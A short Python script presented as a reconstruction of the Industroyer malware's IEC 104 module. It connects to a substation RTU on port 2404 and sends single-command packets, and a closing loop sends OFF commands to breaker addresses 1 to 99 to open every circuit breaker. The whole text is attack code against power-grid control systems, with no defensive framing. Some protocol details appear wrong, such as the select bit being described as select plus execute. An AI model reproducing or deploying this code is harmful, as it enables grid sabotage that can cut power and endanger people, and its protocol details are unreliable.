# Reconstructed 104.dll logic

import socket
import struct

def iec104_send_command(target_ip, ioa, command):
    """
    Send IEC 104 command to substation RTU
    command: 0x01 (ON), 0x02 (OFF)
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, 2404))

    # IEC 104 STARTDT (Start Data Transfer)
    startdt = bytes.fromhex('68 04 07 00 00 00')
    sock.send(startdt)
    sock.recv(1024)  # STARTDT CON

    # Build ASDU (Type ID 45: Single Command)
    apdu_header = bytes.fromhex('68')  # Start byte
    apdu_length = struct.pack('B', 14)  # Length

    # APCI (Application Protocol Control Information)
    apci = bytes.fromhex('0E 00 00 00')  # I-format, send sequence 0

    # ASDU
    type_id = struct.pack('B', 45)  # Single command
    sq = struct.pack('B', 1)        # Sequence of 1 object
    cot = struct.pack('B', 6)       # Cause of transmission: Activation
    oa = struct.pack('B', 1)        # Originator address
    ca = struct.pack('<H', 1)       # Common address

    # Information Object
    ioa_bytes = struct.pack('<I', ioa)[:3]  # 3-byte IOA
    sco = struct.pack('B', command | 0x80)  # Single Command (select + execute)

    asdu = type_id + sq + cot + oa + ca + ioa_bytes + sco

    packet = apdu_header + apdu_length + apci + asdu
    sock.send(packet)

    print(f"[+] Sent IEC 104 command to {target_ip}, IOA {ioa}: {'ON' if command == 0x01 else 'OFF'}")

    sock.close()

# Industroyer attack scenario:
# Open all circuit breakers in substation
for ioa in range(1, 100):  # Iterate through all breaker addresses
    iec104_send_command('192.168.1.10', ioa, 0x02)  # Send OFF command
